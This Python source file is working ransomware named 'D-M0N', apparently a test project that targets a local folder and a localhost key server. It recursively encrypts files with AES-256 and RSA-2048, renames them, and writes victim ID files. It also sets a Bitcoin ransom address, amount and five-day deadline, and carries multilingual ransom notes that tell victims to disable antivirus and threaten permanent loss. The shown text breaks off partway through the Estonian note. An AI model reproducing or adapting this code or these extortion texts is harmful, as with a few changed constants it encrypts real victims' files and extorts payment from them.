#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Encryptor AND decryptor modules
import os, base64, socket, time, datetime, pyperclip
import tkinter as tk
import tkhtmlview as tkh
import webbrowser
from tkinter import ttk
from tkinter import messagebox
from tkinter import simpledialog
from datetime import datetime, timedelta
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization

# Encryptor AND Decryptor constants
ENCRYPTION_DIR = 'C:/Users/PC/Desktop/dossier test ransomware'
ENCRYPTED_FILE_EXTENSION = ".___encrypted___"
INFO_FILE_EXTENSION = ".___info___"
RANSOMWARE_PREFIX = "d-m0n"
SERVER_ADDRESS = ('localhost', 33800)










# ---------- ENCRYPTOR ----------
# ---------- ENCRYPTOR ----------
# ---------- ENCRYPTOR ----------

print("Running Encryptor...")

EXCLUDED_PATHS = ['C:\Intel', 'C:\Logs', 'C:\PerfLogs', 'C:\ProgramData', 'C:\Program Files', 'C:\Program Files (x86)', 'C:\Temp', 'C:\Windows', os.path.join(os.getenv('APPDATA')), os.path.join(os.getenv('LOCALAPPDATA')), os.path.join(os.path.expanduser('~'), 'Desktop', 'Programming')]

def get_info_for_encryption(server_address):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect(server_address)

    try:
        # Ask request
        message = "/to-server/ new"
        client_socket.sendall(message.encode())

        # Get server response
        response = client_socket.recv(4096).decode()
            
        if response.startswith("/to-client/ publickey="):
            # Locate key and id in the string and store them
            public_key_pem_b64 = response[(response.find("publickey=")+10):(response.find("id=")-1)]
            id = response[(response.find("id=")+3):(response.find("date=")-1)]
            date_string = response[(response.find("date=")+5):]

            # Decode public key and transform it into cryptography PublicKey object
            public_key_pem = base64.b64decode(public_key_pem_b64)
            public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())

            return public_key, id, date_string

    finally:
        client_socket.close()

def is_excluded(file_path, excluded_paths, encrypted_file_extension, info_file_extension):
    file_name, file_extension = os.path.splitext(file_path)
    file_directory = os.path.dirname(file_path)
    
    # Check if the file's directory is in the excluded paths, or if it's an encrypted or info file
    if file_directory in excluded_paths or file_extension == encrypted_file_extension or file_extension == info_file_extension or RANSOMWARE_PREFIX in file_name:
        return True
    else:
        return False

def encrypt_file(file_path, public_key, encrypted_file_extension):

    print(f"Encrypting file {file_path}...")

    # Generate a random AES key
    print("    Generating AES-256 key...")
    aes_key = os.urandom(32)  # AES-256
    iv = os.urandom(16)  # AES block size for CBC mode

    # Encrypt the file using AES
    print("    Reading file content...")
    with open(file_path, 'rb') as f:
        data = f.read()

    print("    Generating AES-256 cipher...")
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Pad data to be multiple of block size
    print("    Padding data...")
    pad_size = 16 - len(data) % 16
    padded_data = data + bytes([pad_size] * pad_size)

    print("    Encrypting data with AES-256...")
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    print("    Encrypting AES-256 key with RSA-2048 public key...")
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )  # Encrypt the AES key with RSA

    print("    Adding extension...")
    os.rename(file_path, file_path + encrypted_file_extension)  # Add .encrypted extension to the file

    print("    Writing encrypted key and encrypted data in the file...")
    # Save the encrypted AES key and IV with the encrypted file
    with open(file_path + encrypted_file_extension, 'wb') as f:
        f.write(base64.b64encode(encrypted_aes_key) + b'\n' + base64.b64encode(iv) + b'\n' + encrypted_data)

    print(f"  Encrypted file {file_path}\n")

def encrypt(dir, public_key, id, date_string, excluded_paths, encrypted_file_extension, info_file_extension):
    # Go to every file and folder
    for root, dirs, files in os.walk(dir):
        for filename in files:
            file_path = os.path.join(root, filename)
            if os.path.isfile(file_path) and not is_excluded(file_path, excluded_paths, encrypted_file_extension, info_file_extension):
                encrypt_file(file_path, public_key, encrypted_file_extension)

        # Create files to store ID and encryption date
        if not os.path.exists(os.path.join(root, f"{os.path.basename(root)}{info_file_extension}")):
            with open(os.path.join(root, f"{os.path.basename(root)}{info_file_extension}"), "w") as f:
                f.write(id + "\n" + str(date_string))

# Search if this computer has already been encrypted by the ransomware. Return True if it's the case, False if it's not
def already_encrypted(dir, encrypted_file_extension, info_file_extension):
    # Walk in all folders
    for root, dirs, files in os.walk(dir):
        for filename in files:
            if filename.endswith(encrypted_file_extension) or filename.endswith(info_file_extension):  # Check if the file extension is '.___info___' or '.___encrypted___'
                return True
            
    return False


# Execute encryptor
try:
    public_key, id, date_string = get_info_for_encryption(SERVER_ADDRESS)  # Get RSA public key and victim ID
    encrypt(ENCRYPTION_DIR, public_key, id, date_string, EXCLUDED_PATHS, ENCRYPTED_FILE_EXTENSION, INFO_FILE_EXTENSION)  # encrypt
except: pass










# ---------- DECRYPTOR ----------
# ---------- DECRYPTOR ----------
# ---------- DECRYPTOR ----------

print("Running Decryptor...")

BTC_ADDRESS = "bc1ph5k4nspyjq0pvjuf5n3vx2qp5e76xl6wlm4l3qw5e9sxckqv9kyq0yeezv"
BTC_RANSOM = 0.01
BTC_FEES_MULTIPLICATOR = 1.2
DATE_FORMAT = "%Y-%m-%d %H:%M:%S.%f"
MAX_DAYS_TO_PAY = 5
DEFAULT_LANGUAGE = "EN"
LANGUAGES = [
"EN", "AR", "BN", "CS", "DA", "DE", "EL", "ES", "ET", "FI",
"FR", "HI", "HR", "HU", "ID", "IT", "JA", "KO", "LT", "LV",
"MN", "NL", "PL", "PT", "RO", "RU", "SV", "SW", "TH", "TR",
"UK", "ZH"
]
LANGUAGES_NAMES = [
"English", "العربية", "বাংলা", "Čeština", "Dansk", "Deutsch",
"Ελληνικά", "Español", "Eesti", "Suomi", "Français", "हिंदी",
"Hrvatski", "Magyar", "Bahasa Indonesia", "Italiano", "日本語",
"한국어", "Lietuvių", "Latviešu", "Монгол", "Nederlands",
"Polski", "Português", "Română", "Русский", "Svenska",
"Swahili", "ไทย", "Türkçe", "Українська", "中文 (官话)"
]
FONT = "Verdana"
BG_COLOR = "red"
BUY_BITCOIN_URL = "https://www.bitcoin.com/get-started/how-to-buy-bitcoin/"
SEND_BITCOIN_URL = "https://www.bitcoin.com/get-started/how-to-send-bitcoin/"
TEXT = {
    "title": {
        "EN": "⚠ WARNING! All your files have been ENCRYPTED!!! 🔒",
        "AR": "⚠ تحذير! تم تشفير جميع ملفاتك!!! 🔒",
        "BN": "⚠ সতর্কতা! আপনার সমস্ত ফাইল এনক্রিপ্ট করা হয়েছে!!! 🔒",
        "CS": "⚠ UPOZORNĚNÍ! Všechny vaše soubory byly ZAŠIFROVÁNY!!! 🔒",
        "DA": "⚠ ADVARSELSE! Alle dine filer er blevet KRYPTERET!!! 🔒",
        "DE": "⚠ WARNUNG! Alle Ihre Dateien wurden VERSCHLÜSSELT!!! 🔒",
        "EL": "⚠ ΠΡΟΕΙΔΟΠΟΙΗΣΗ! Όλα τα αρχεία σας έχουν ΚΡΥΠΤΟΓΡΑΦΗΘΕΙ!!! 🔒",
        "ES": "⚠ ¡ADVERTENCIA! ¡Todos sus archivos han sido ENCRIPTADOS!!! 🔒",
        "ET": "⚠ HOIATUS! Kõik teie failid on KRÜPTEERITUD!!! 🔒",
        "FI": "⚠ VAROITUS! Kaikki tiedostosi on SALATTU!!! 🔒",
        "FR": "⚠ ATTENTION ! Tous vos fichiers ont été CHIFFRÉS !!! 🔒",
        "HI": "⚠ चेतावनी! आपकी सभी फ़ाइलें एन्क्रिप्ट की गई हैं!!! 🔒",
        "HR": "⚠ UPOZORENJE! Svi vaši datoteke su ENKRIPTIRANI!!! 🔒",
        "HU": "⚠ FIGYELMEZTETÉS! Minden fájlod TITKOSÍTOTT!!! 🔒",
        "ID": "⚠ PERINGATAN! Semua file Anda TELAH DIENKRIPSI!!! 🔒",
        "IT": "⚠ ATTENZIONE! Tutti i tuoi file sono stati CRIPTATI!!! 🔒",
        "JA": "⚠ 警告！すべてのファイルが暗号化されました!!! 🔒",
        "KO": "⚠ 경고! 모든 파일이 암호화되었습니다!!! 🔒",
        "LT": "⚠ ĮSPĖJIMAS! Visi jūsų failai buvo UŽŠIFRUOTI!!! 🔒",
        "LV": "⚠ BRĪDINĀJUMS! Visi jūsu faili ir TIEK ŠIFRĒTI!!! 🔒",
        "MN": "⚠ СЭРГҮҮЛЭГ! Таны бүх файлууд ШИФРЛЭГДСЭН!!! 🔒",
        "NL": "⚠ WAARSCHUWING! Al uw bestanden zijn ENCRYPTED!!! 🔒",
        "PL": "⚠ OSTRZEŻENIE! Wszystkie twoje pliki zostały ZASZYFROWANE!!! 🔒",
        "PT": "⚠ AVISO! Todos os seus arquivos foram CRIPTografados!!! 🔒",
        "RO": "⚠ AVERTISMENT! Toate fișierele dvs. au fost ȘIFRATTE!!! 🔒",
        "RU": "⚠ ПРЕДУПРЕЖДЕНИЕ! Все ваши файлы были ЗАШИФРОВАНЫ!!! 🔒",
        "SV": "⚠ VARNING! Alla dina filer har KRYPTERATS!!! 🔒",
        "SW": "⚠ ONYO! Faili zako zote zimeFICHWA!!! 🔒",
        "TH": "⚠ คำเตือน! ไฟล์ทั้งหมดของคุณถูกเข้ารหัสแล้ว!!! 🔒",
        "TR": "⚠ UYARI! Tüm dosyalarınız ŞİFRELENDİ!!! 🔒",
        "UK": "⚠ ПОПЕРЕДЖЕННЯ! Усі ваші файли були ЗАШИФРОВАНІ!!! 🔒",
        "ZH": "⚠ 警告！您的所有文件已被加密！！！🔒"
    },
    "selectlang": {
        "EN": "Language: ",
        "AR": "اللغة: ",
        "BN": "ভাষা: ",
        "CS": "Jazyk: ",
        "DA": "Sprog: ",
        "DE": "Sprache: ",
        "EL": "Γλώσσα: ",
        "ES": "Idioma: ",
        "ET": "Keel: ",
        "FI": "Kieli: ",
        "FR": "Langue: ",
        "HI": "भाषा: ",
        "HR": "Jezik: ",
        "HU": "Nyelv: ",
        "ID": "Bahasa: ",
        "IT": "Lingua: ",
        "JA": "言語: ",
        "KO": "언어: ",
        "LT": "Kalba: ",
        "LV": "Valoda: ",
        "MN": "Хэл: ",
        "NL": "Taal: ",
        "PL": "Język: ",
        "PT": "Idioma: ",
        "RO": "Limba: ",
        "RU": "Язык: ",
        "SV": "Språk: ",
        "SW": "Lugha: ",
        "TH": "ภาษา: ",
        "TR": "Dil: ",
        "UK": "Мова: ",
        "ZH": "语言: "
    },
    "main" : {
        "EN": f"<div style='overflow: auto;'><h5>What is that?</h5><p style='font-size: 10px;'>You've been a victim of the <b>D-M0N Ransomware</b> virus! Your files have been encrypted (so now unusable) using <b>AES-256</b> (CBC mode) and <b>RSA-2048</b>, which are <b>military grade encryption algorithms</b>. To recover your files, you'll have to follow the instructions below.</p><h5>How can I recover my files?</h5><p style='font-size: 10px;'>Before everything, please disable your antivirus, because if it is enabled it may delete this program and your files will be <b>lost forever</b>.<br>Your antivirus is now disabled? Alright, now let's get started: this is a <b>RANSOMWARE</b>, so if you want to recover your files you will have to pay us a <b>RANSOM</b> in <b>bitcoin</b>, which is currently <b>{BTC_RANSOM} BTC</b> (please check for the current price of Bitcoin).<br><b style='color: red;'>You have {MAX_DAYS_TO_PAY} days to pay (counter began at the moment the files were encrypted), passed 5 days your files will be permanently lost and you will NEVER be able to recover them. NEVER EVER.</b><br>Please remember that if you choose not to pay the ransom, you will not be able to recover your files neither, because only we have the private key (which can decrypt the files) and we use the safest encryption algorithms of the world, even secrets services and army use it :D<br>---<br>If you've chosen to recover your files, please follow the instructions on the 'Decryption Instructions' panel on the left to correctly pay the ransom. After you paid it, we guarantee your files will be 100% decrypted, this virus will be deleted and you will be able to use your computer the same way as before.</p><p style='font-size: 14px; color: red;'><h5>WARNING! If you try to delete this software or its files or decrypt your files without paying the ransom, your files will stay encrypted and you will never see them again!</h5></p></div>",
        "AR": f"<div style='overflow: auto;'><h5>ما هذا؟</h5><p style='font-size: 10px;'>لقد كنت ضحية لفيروس <b>D-M0N Ransomware</b>! تم تشفير ملفاتك (لذا فهي غير قابلة للاستخدام الآن) باستخدام <b>AES-256</b> (وضع CBC) و<b>RSA-2048</b>، وهما <b>خوارزميات تشفير من الدرجة العسكرية</b>. لاستعادة ملفاتك، عليك اتباع التعليمات أدناه.</p><h5>كيف يمكنني استعادة ملفاتي؟</h5><p style='font-size: 10px;'>قبل كل شيء، يرجى تعطيل برنامج مكافحة الفيروسات الخاص بك، لأنه إذا كان مفعلًا فإنه قد يحذف هذا البرنامج وستكون ملفاتك <b>مفقودة إلى الأبد</b>.<br>هل تم تعطيل برنامج مكافحة الفيروسات الخاص بك الآن؟ حسنًا، دعنا نبدأ: هذا هو <b>RANSOMWARE</b>، لذا إذا كنت تريد استعادة ملفاتك، سيتعين عليك دفع <b>فدية</b> لنا بعملة <b>البيتكوين</b>، والتي هي حاليًا <b>{BTC_RANSOM} BTC</b> (يرجى التحقق من السعر الحالي للبيتكوين).<br><b style='color: red;'>لديك {MAX_DAYS_TO_PAY} يومًا للدفع (بدأ العد التنازلي في اللحظة التي تم فيها تشفير الملفات)، بعد 5 أيام ستفقد ملفاتك بشكل دائم ولن تتمكن أبدًا من استعادتها. أبدًا.</b><br>تذكر أنه إذا اخترت عدم دفع الفدية، فلن تتمكن من استعادة ملفاتك أيضًا، لأننا وحدنا لدينا المفتاح الخاص (الذي يمكنه فك تشفير الملفات) ونستخدم أكثر خوارزميات التشفير أمانًا في العالم، حتى تستخدمها الخدمات السرية والجيش :D<br>---<br>إذا اخترت استعادة ملفاتك، يرجى اتباع التعليمات في لوحة 'تعليمات فك التشفير' على اليسار لدفع الفدية بشكل صحيح. بعد دفعها، نضمن أن ملفاتك سيتم فك تشفيرها بنسبة 100%، وسيتم حذف هذا الفيروس وستكون قادرًا على استخدام جهاز الكمبيوتر الخاص بك بنفس الطريقة كما كان من قبل.</p><p style='font-size: 14px; color: red;'><h5>تحذير! إذا حاولت حذف هذا البرنامج أو ملفاته أو فك تشفير ملفاتك دون دفع الفدية، ستبقى ملفاتك مشفرة ولن تراها مرة أخرى!</h5></p></div>",
        "BN": f"<div style='overflow: auto;'><h5>এটি কি?</h5><p style='font-size: 10px;'>আপনি <b>D-M0N Ransomware</b> ভাইরাসের শিকার হয়েছেন! আপনার ফাইলগুলো এনক্রিপ্ট করা হয়েছে (এখন অকার্যকর) <b>AES-256</b> (CBC মোড) এবং <b>RSA-2048</b> ব্যবহার করে, যা <b>সামরিক স্তরের এনক্রিপশন অ্যালগরিদম</b>। আপনার ফাইলগুলো পুনরুদ্ধার করতে, আপনাকে নিচের নির্দেশাবলী অনুসরণ করতে হবে।</p><h5>আমি কিভাবে আমার ফাইলগুলো পুনরুদ্ধার করতে পারি?</h5><p style='font-size: 10px;'>সবকিছুর আগে, দয়া করে আপনার অ্যান্টিভাইরাস বন্ধ করুন, কারণ এটি চালু থাকলে এটি এই প্রোগ্রামটি মুছে ফেলতে পারে এবং আপনার ফাইলগুলো <b>চিরতরে হারিয়ে যাবে</b>।<br>আপনার অ্যান্টিভাইরাস এখন বন্ধ? সুবর্ণ, এখন শুরু করি: এটি একটি <b>RANSOMWARE</b>, তাই যদি আপনি আপনার ফাইলগুলো পুনরুদ্ধার করতে চান, আপনাকে আমাদের <b>RANSOM</b> দিতে হবে <b>বিটকয়েন</b> এ, যা বর্তমানে <b>{BTC_RANSOM} BTC</b> (বিটকয়েনের বর্তমান মূল্য পরীক্ষা করুন)।<br><b style='color: red;'>আপনার {MAX_DAYS_TO_PAY} দিন সময় আছে পরিশোধ করতে (গণনা শুরু হয়েছিল যখন ফাইলগুলো এনক্রিপ্ট হয়েছিল), 5 দিন পার হলে আপনার ফাইলগুলো স্থায়ীভাবে হারিয়ে যাবে এবং আপনি কখনোই সেগুলো পুনরুদ্ধার করতে পারবেন না। কখনোই।</b><br>মনে রাখবেন, যদি আপনি মুক্তিপণ দিতে না চান, তাহলে আপনি আপনার ফাইলগুলো পুনরুদ্ধার করতে পারবেন না, কারণ আমাদের কাছে একমাত্র ব্যক্তিগত কী রয়েছে (যা ফাইলগুলো ডি-এনক্রিপ্ট করতে পারে) এবং আমরা বিশ্বের সবচেয়ে নিরাপদ এনক্রিপশন অ্যালগরিদম ব্যবহার করি, এমনকি গোপন সেবা এবং সেনাবাহিনীও এটি ব্যবহার করে :D<br>---<br>যদি আপনি আপনার ফাইলগুলো পুনরুদ্ধার করতে চান, তাহলে দয়া করে বাম প্যানেলে 'ডিক্রিপশন নির্দেশাবলী' এর নির্দেশনা অনুসরণ করুন সঠিকভাবে মুক্তিপণ পরিশোধ করতে। একবার আপনি এটি পরিশোধ করলে, আমরা নিশ্চিত করি আপনার ফাইলগুলো 100% ডিক্রিপ্ট হবে, এই ভাইরাসটি মুছে ফেলা হবে এবং আপনি আপনার কম্পিউটারটি আগের মতোই ব্যবহার করতে পারবেন।</p><p style='font-size: 14px; color: red;'><h5>সতর্কতা! যদি আপনি এই সফটওয়্যার বা এর ফাইলগুলো মুছে ফেলতে বা মুক্তিপণ না দিয়ে আপনার ফাইলগুলো ডিক্রিপ্ট করার চেষ্টা করেন, তাহলে আপনার ফাইলগুলো এনক্রিপ্টেড থাকবে এবং আপনি আর কখনো সেগুলো দেখতে পাবেন না!</h5></p></div>",
        "CS": f"<div style='overflow: auto;'><h5>Co to je?</h5><p style='font-size: 10px;'>Stali jste se obětí viru <b>D-M0N Ransomware</b>! Vaše soubory byly zašifrovány (takže nyní jsou nepoužitelné) pomocí <b>AES-256</b> (CBC režim) a <b>RSA-2048</b>, což jsou <b>vojenské šifrovací algoritmy</b>. Abyste získali své soubory zpět, musíte se řídit pokyny níže.</p><h5>Jak mohu obnovit své soubory?</h5><p style='font-size: 10px;'>Než začneme, prosím, vypněte svůj antivirový program, protože pokud je zapnutý, může tento program smazat a vaše soubory budou <b>navždy ztraceny</b>.<br>Váš antivirový program je nyní vypnutý? Dobře, začněme: toto je <b>RANSOMWARE</b>, takže pokud chcete obnovit své soubory, budete nám muset zaplatit <b>výkupné</b> v <b>bitcoinech</b>, které je v současnosti <b>{BTC_RANSOM} BTC</b> (zkontrolujte aktuální cenu bitcoinu).<br><b style='color: red;'>Máte {MAX_DAYS_TO_PAY} dní na zaplacení (odpočet začal v okamžiku, kdy byly soubory zašifrovány), po 5 dnech budou vaše soubory trvale ztraceny a nikdy je nebudete moci obnovit. NIKDY.</b><br>Pamatujte, že pokud se rozhodnete nezaplatit výkupné, své soubory také neobnovíte, protože pouze my máme soukromý klíč (který může soubory dešifrovat) a používáme nejbezpečnější šifrovací algoritmy na světě, které používají i tajné služby a armáda :D<br>---<br>Pokud jste se rozhodli obnovit své soubory, prosím, následujte pokyny na panelu 'Pokyny k dešifrování' vlevo, abyste správně zaplatili výkupné. Po zaplacení zaručujeme, že vaše soubory budou 100% dešifrovány, tento virus bude odstraněn a vy budete moci používat svůj počítač jako předtím.</p><p style='font-size: 14px; color: red;'><h5>VAROVÁNÍ! Pokud se pokusíte smazat tento software nebo jeho soubory nebo dešifrovat své soubory bez zaplacení výkupného, vaše soubory zůstanou zašifrované a nikdy je znovu neuvidíte!</h5></p></div>",
        "DA": f"<div style='overflow: auto;'><h5>Hvad er det?</h5><p style='font-size: 10px;'>Du er blevet offer for <b>D-M0N Ransomware</b> virus! Dine filer er blevet krypteret (så nu ubrugelige) ved hjælp af <b>AES-256</b> (CBC-tilstand) og <b>RSA-2048</b>, som er <b>militære krypteringsalgoritmer</b>. For at gendanne dine filer skal du følge instruktionerne nedenfor.</p><h5>Hvordan kan jeg gendanne mine filer?</h5><p style='font-size: 10px;'>Først og fremmest skal du deaktivere dit antivirusprogram, fordi hvis det er aktiveret, kan det slette dette program, og dine filer vil være <b>tabt for evigt</b>.<br>Er dit antivirus nu deaktiveret? Godt, lad os komme i gang: dette er en <b>RANSOMWARE</b>, så hvis du vil gendanne dine filer, skal du betale os en <b>LØSE</b> i <b>bitcoin</b>, som i øjeblikket er <b>{BTC_RANSOM} BTC</b> (tjek venligst den aktuelle pris på Bitcoin).<br><b style='color: red;'>Du har {MAX_DAYS_TO_PAY} dage til at betale (nedtællingen begyndte på det tidspunkt, hvor filerne blev krypteret), efter 5 dage vil dine filer være permanent tabt, og du vil ALDRIG kunne gendanne dem. ALDRIG.</b><br>Husk, at hvis du vælger ikke at betale løsepengene, vil du heller ikke kunne gendanne dine filer, fordi kun vi har den private nøgle (som kan dekryptere filerne), og vi bruger de sikreste krypteringsalgoritmer i verden, selv hemmelige tjenester og militæret bruger dem :D<br>---<br>Hvis du har valgt at gendanne dine filer, skal du følge instruktionerne i panelet 'Dekrypteringsinstruktioner' til venstre for korrekt at betale løsepengene. Når du har betalt, garanterer vi, at dine filer vil blive 100% dekrypteret, denne virus vil blive slettet, og du vil kunne bruge din computer som før.</p><p style='font-size: 14px; color: red;'><h5>ADVARSEL! Hvis du forsøger at slette denne software eller dens filer eller dekryptere dine filer uden at betale løsepengene, vil dine filer forblive krypterede, og du vil aldrig se dem igen!</h5></p></div>",
        "DE": f"<div style='overflow: auto;'><h5>Was ist das?</h5><p style='font-size: 10px;'>Sie sind Opfer des <b>D-M0N Ransomware</b> Virus geworden! Ihre Dateien wurden verschlüsselt (also jetzt unbrauchbar) mit <b>AES-256</b> (CBC-Modus) und <b>RSA-2048</b>, die <b>militärische Verschlüsselungsalgorithmen</b> sind. Um Ihre Dateien wiederherzustellen, müssen Sie die folgenden Anweisungen befolgen.</p><h5>Wie kann ich meine Dateien wiederherstellen?</h5><p style='font-size: 10px;'>Zuerst deaktivieren Sie bitte Ihr Antivirenprogramm, denn wenn es aktiviert ist, kann es dieses Programm löschen und Ihre Dateien werden <b>für immer verloren</b> sein.<br>Ist Ihr Antivirenprogramm jetzt deaktiviert? Gut, lassen Sie uns anfangen: dies ist ein <b>RANSOMWARE</b>, also wenn Sie Ihre Dateien wiederherstellen möchten, müssen Sie uns ein <b>LOSKÖNIG</b> in <b>Bitcoin</b> zahlen, das derzeit <b>{BTC_RANSOM} BTC</b> beträgt (bitte überprüfen Sie den aktuellen Preis von Bitcoin).<br><b style='color: red;'>Sie haben {MAX_DAYS_TO_PAY} Tage Zeit zu zahlen (der Countdown begann in dem Moment, als die Dateien verschlüsselt wurden), nach 5 Tagen werden Ihre Dateien dauerhaft verloren gehen, und Sie werden sie NIEMALS zurückbekommen. NIEMALS.</b><br>Bitte denken Sie daran, dass Sie, wenn Sie sich entscheiden, das Lösegeld nicht zu zahlen, Ihre Dateien auch nicht wiederherstellen können, denn nur wir haben den privaten Schlüssel (der die Dateien entschlüsseln kann) und wir verwenden die sichersten Verschlüsselungsalgorithmen der Welt, sogar Geheimdienste und das Militär verwenden sie :D<br>---<br>Wenn Sie sich entschieden haben, Ihre Dateien wiederherzustellen, folgen Sie bitte den Anweisungen im Bereich 'Entschlüsselungsanweisungen' links, um das Lösegeld korrekt zu zahlen. Nachdem Sie bezahlt haben, garantieren wir, dass Ihre Dateien zu 100 % entschlüsselt werden, dieser Virus gelöscht wird und Sie Ihren Computer wie zuvor nutzen können.</p><p style='font-size: 14px; color: red;'><h5>WARNUNG! Wenn Sie versuchen, diese Software oder deren Dateien zu löschen oder Ihre Dateien ohne Zahlung des Lösegeldes zu entschlüsseln, bleiben Ihre Dateien verschlüsselt und Sie werden sie nie wieder sehen!</h5></p></div>",
        "EL": f"<div style='overflow: auto;'><h5>Τι είναι αυτό;</h5><p style='font-size: 10px;'>Έχετε γίνει θύμα του ιού <b>D-M0N Ransomware</b>! Τα αρχεία σας έχουν κρυπτογραφηθεί (οπότε τώρα είναι μη χρησιμοποιήσιμα) χρησιμοποιώντας <b>AES-256</b> (λειτουργία CBC) και <b>RSA-2048</b>, τα οποία είναι <b>στρατιωτικοί αλγόριθμοι κρυπτογράφησης</b>. Για να ανακτήσετε τα αρχεία σας, θα πρέπει να ακολουθήσετε τις παρακάτω οδηγίες.</p><h5>Πώς μπορώ να ανακτήσω τα αρχεία μου;</h5><p style='font-size: 10px;'>Πριν από όλα, παρακαλώ απενεργοποιήστε το antivirus σας, γιατί αν είναι ενεργοποιημένο μπορεί να διαγράψει αυτό το πρόγραμμα και τα αρχεία σας θα είναι <b>χαμένα για πάντα</b>.<br>Το antivirus σας είναι τώρα απενεργοποιημένο; Ωραία, ας ξεκινήσουμε: αυτό είναι ένα <b>RANSOMWARE</b>, οπότε αν θέλετε να ανακτήσετε τα αρχεία σας, θα πρέπει να μας πληρώσετε ένα <b>ΛΥΤΡΟ</b> σε <b>bitcoin</b>, το οποίο είναι αυτή τη στιγμή <b>{BTC_RANSOM} BTC</b> (παρακαλώ ελέγξτε την τρέχουσα τιμή του Bitcoin).<br><b style='color: red;'>Έχετε {MAX_DAYS_TO_PAY} ημέρες για να πληρώσετε (η αντίστροφη μέτρηση ξεκίνησε τη στιγμή που κρυπτογραφήθηκαν τα αρχεία), μετά από 5 ημέρες τα αρχεία σας θα χαθούν μόνιμα και δεν θα μπορείτε ΠΟΤΕ να τα ανακτήσετε. ΠΟΤΕ.</b><br>Θυμηθείτε ότι αν επιλέξετε να μην πληρώσετε το λύτρο, δεν θα μπορείτε να ανακτήσετε τα αρχεία σας, γιατί μόνο εμείς έχουμε το ιδιωτικό κλειδί (που μπορεί να αποκρυπτογραφήσει τα αρχεία) και χρησιμοποιούμε τους ασφαλέστερους αλγόριθμους κρυπτογράφησης στον κόσμο, ακόμη και οι μυστικές υπηρεσίες και οι στρατοί τους χρησιμοποιούν :D<br>---<br>Αν έχετε επιλέξει να ανακτήσετε τα αρχεία σας, παρακαλώ ακολουθήστε τις οδηγίες στον πίνακα 'Οδηγίες Αποκρυπτογράφησης' αριστερά για να πληρώσετε σωστά το λύτρο. Αφού το πληρώσετε, εγγυόμαστε ότι τα αρχεία σας θα αποκρυπτογραφηθούν 100%, αυτός ο ιός θα διαγραφεί και θα μπορείτε να χρησιμοποιήσετε τον υπολογιστή σας όπως πριν.</p><p style='font-size: 14px; color: red;'><h5>ΠΡΟΕΙΔΟΠΟΙΗΣΗ! Αν προσπαθήσετε να διαγράψετε αυτό το λογισμικό ή τα αρχεία του ή να αποκρυπτογραφήσετε τα αρχεία σας χωρίς να πληρώσετε το λύτρο, τα αρχεία σας θα παραμείνουν κρυπτογραφημένα και δεν θα τα δείτε ποτέ ξανά!</h5></p></div>",
        "ES": f"<div style='overflow: auto;'><h5>¿Qué es esto?</h5><p style='font-size: 10px;'>¡Has sido víctima del virus <b>D-M0N Ransomware</b>! Tus archivos han sido cifrados (por lo que ahora son inutilizables) utilizando <b>AES-256</b> (modo CBC) y <b>RSA-2048</b>, que son <b>algoritmos de cifrado de grado militar</b>. Para recuperar tus archivos, deberás seguir las instrucciones a continuación.</p><h5>¿Cómo puedo recuperar mis archivos?</h5><p style='font-size: 10px;'>Antes que nada, por favor desactiva tu antivirus, porque si está activado puede eliminar este programa y tus archivos estarán <b>perdidos para siempre</b>.<br>¿Tu antivirus ya está desactivado? Muy bien, ¡comencemos! Esto es un <b>RANSOMWARE</b>, así que si deseas recuperar tus archivos, tendrás que pagarnos un <b>RESCATE</b> en <b>bitcoin</b>, que actualmente es <b>{BTC_RANSOM} BTC</b> (por favor verifica el precio actual del Bitcoin).<br><b style='color: red;'>Tienes {MAX_DAYS_TO_PAY} días para pagar (el contador comenzó en el momento en que se cifraron los archivos), pasados 5 días tus archivos se perderán permanentemente y nunca podrás recuperarlos. NUNCA.</b><br>Recuerda que si decides no pagar el rescate, tampoco podrás recuperar tus archivos, porque solo nosotros tenemos la clave privada (que puede descifrar los archivos) y utilizamos los algoritmos de cifrado más seguros del mundo, incluso los servicios secretos y el ejército los utilizan :D<br>---<br>Si has decidido recuperar tus archivos, por favor sigue las instrucciones en el panel de 'Instrucciones de Desencriptación' a la izquierda para pagar correctamente el rescate. Después de que lo pagues, garantizamos que tus archivos serán desencriptados al 100%, este virus será eliminado y podrás usar tu computadora de la misma manera que antes.</p><p style='font-size: 14px; color: red;'><h5>¡ADVERTENCIA! Si intentas eliminar este software o sus archivos o desencriptar tus archivos sin pagar el rescate, tus archivos permanecerán cifrados y nunca los volverás a ver!</h5></p></div>",
        "ET": f"<div style='overflow: auto;'><h5>Mis see on?</h5><p style='font-size: 10px;'>Olete saanud <b>D-M0N Ransomware</b> viiruse ohvriks! Teie failid on krüpteeritud (seega on need nüüd kasutuskõlbmatud) kasutades <b>AES-256</b> (CBC režiim) ja <b>RSA-2048</b>, mis on <b>militaarse tasemega krüpteerimisalgoritmid</b>. Oma failide taastamiseks peate järgima allolevaid juhiseid.</p><h5>Kuidas ma saan oma faile taastada?</h5><p style='font-size: 10px;'>Esiteks, palun keelake oma viirusetõrje, sest kui see on sisse lülitatud, võib see selle programmi kustutada ja teie failid jäävad <b>igaveseks kaduma</b>.<br>Kas teie viirusetõrje on nüüd keelatud? Suurepärane, alustame: see on <b>RANSOMWARE</b>, seega kui soovite oma faile taastada, peate maksma meile <b>VÕLAGA</b> <b>bitcoini</b> kujul, mis on praegu <b>{BTC_RANSOM} BTC</b> (palun kontrollige Bitcoini hetke hinda).<br><b style='color: red;'>Teil on {MAX_DAYS_TO_PAY} päeva maksmiseks (loendus algas hetkel, kui failid krüpteeriti), 5 päeva möödudes kaotavad teie failid igaveseks ja te ei saa neid KUNAGI taastada. KUNAGI.</b><br>Palun pidage meeles, et kui otsustate mitte maksta lunastust, ei saa te ka oma faile taastada, sest ainult meil on privaatvõti (mis suudab faile dekrüpteerida) ja me kasutame maailma kõige turvalisemaid krüpteerimisalgoritme, isegi salateenistused 